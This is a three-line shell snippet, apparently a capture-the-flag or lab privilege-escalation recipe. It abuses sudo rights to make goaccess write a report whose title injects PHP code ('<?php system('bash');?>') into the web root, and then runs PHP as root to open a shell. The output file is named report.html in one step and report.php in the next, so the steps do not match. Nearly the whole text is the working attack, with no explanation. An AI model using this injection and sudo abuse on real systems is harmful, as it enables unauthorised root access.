```
touch a.log
---
sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title="<?php system('bash');?>"
---
sudo /usr/bin/php /var/www/html/report.php
```